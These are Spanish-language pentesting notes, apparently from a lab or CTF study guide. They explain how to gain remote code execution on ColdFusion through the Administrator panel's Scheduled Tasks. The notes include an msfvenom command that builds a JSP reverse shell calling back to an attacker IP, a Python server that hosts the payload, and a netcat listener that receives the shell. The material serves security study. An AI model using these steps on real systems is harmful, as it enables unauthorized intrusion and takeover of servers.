[[Apuntes]]
## ¿Qué es y como funciona?

Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris

## RCE administrator panel

Si conseguimos acceder al Administrator del ColdFusion como el usuario Administrador y tenemos directory listing de los archivos del sistema, podemos subir un archivo malicioso que puede ser tanto ASP, JSP o PHP el cúal nos permita tener acceso al sistema victima, se puede subir mediante:

- Scheduled Tasks


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FsUgCkvUFJK6GRWca5gXc%252Fimagen.png%3Falt%3Dmedia%26token%3D6f0fbb0f-a725-41b4-bda3-cf69e5c77b86&width=768&dpr=4&quality=100&sign=04b9d2141ae0f3a4fa9f003ffb59bff68fd4f56c4e8a810b41b57c5bf0a13b17)

1. Entramos en Schedule Tasks y le damos a Shecule New Task

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252Fxtl4zBTfnnlpNVby8fty%252Fimagen.png%3Falt%3Dmedia%26token%3D6893f594-76eb-4f59-ba1e-7a74b43a94a0&width=768&dpr=4&quality=100&sign=f809cf75e17e149ae5c1755aea4a96ad33e59551b8b8fca41d83879194a12158)

1. Y antes de poner los nombres, creamos con msfvenom el payload que subiremos a la máquina victima y que nos dará acceso a ella.


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252F7XRsDZlCkTRjzrmgrNxO%252Fimagen.png%3Falt%3Dmedia%26token%3D35dc8354-908c-493d-a3af-4e73e6566834&width=768&dpr=4&quality=100&sign=4c6380761887d3cd722a879140be5da937baac594d3a2cddd6522754b3592bf5)

Seleccionamos la java/jsp_shell_reverse_tcp

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4443 -o exploit.jsp
```

1. Donde está el exploit.jsp abrimos un servidor con python para que lo descarge el ColdFusion y lo suba.


```
python3 -m http.server 9000
```

- Para saber donde se alojan los archivos, tenemos que ir a Server Settings --> Mapping


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FjrWLgOkKXtfXaXA2nz1q%252Fimagen.png%3Falt%3Dmedia%26token%3D271eef78-8053-4777-aa4e-8555e11488c0&width=768&dpr=4&quality=100&sign=c438c560ee091e40539e1389bbfcfbd95fb36453bf232e8d583ab545de2132c8)

Alojamiento archivos que se suben

1. Una vez ya sabemos donde se suben los archivos y hemos creado el payload, ahora toca rellenar la tarea.

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252Fa4t66lr4HlkGQ3VBDtf1%252Fimagen.png%3Falt%3Dmedia%26token%3D97c7efa5-c4fa-4aed-bf25-74c5341407e7&width=768&dpr=4&quality=100&sign=b4073684464319bfaf6fea11acd07c7075cca33ac153fb0deea4333a15e8aed7)

Tarea programada

1. Ejecutamos la tarea para que se descarge el exploit.jsp


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252F5ZdV1CvtuBGKrbUCglMj%252Fimagen.png%3Falt%3Dmedia%26token%3D1351ee9b-8872-4374-8c89-95ed94bb44aa&width=768&dpr=4&quality=100&sign=92e6b9d4b7dfa1e8b4a2262c60f6f21e4165ba7a928bcc388b437d45bac4d0e8)

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252Fjz5uFBGhpsSt5qjiW3n5%252Fimagen.png%3Falt%3Dmedia%26token%3De21c1e07-f544-4e55-8d4d-d45e5589f9e4&width=768&dpr=4&quality=100&sign=57072b257b11065fa2cc933c2c8cbb8798e2efd6ded7beebe8b65e86088b5adc)

Petición GET al exploit.jsp

1. Si actualizamos el directory listing vemos que está el exploit.jsp


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FvfaHlE1DJ3zVRliKStRY%252Fimagen.png%3Falt%3Dmedia%26token%3Dbd5a9456-6716-4d84-b7ca-b10d0f479103&width=768&dpr=4&quality=100&sign=f1bd0b1bf048a20b9e4668d88650a8f0d5cf441aff8d713477ead3a248acec57)

1. Ponemos un listener para que espere la petición que nos dará el exploit.jsp una vez le demos click

```
rlwrap -nc -lvnp 4443 # rlwrap para tener una consola interactiva, poder hacer Ctrl+L y mover tranquilamente las flechas etc
```

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252Fgy6VBp69LYyIyAja2OuI%252Fimagen.png%3Falt%3Dmedia%26token%3D88932704-12ff-4b7c-9e0b-7524fc2dc6aa&width=768&dpr=4&quality=100&sign=231ca974144b087c34044488b27e35e63880bbb6ae07fd7f66243af93c5b8d81)

	Shell sistema victima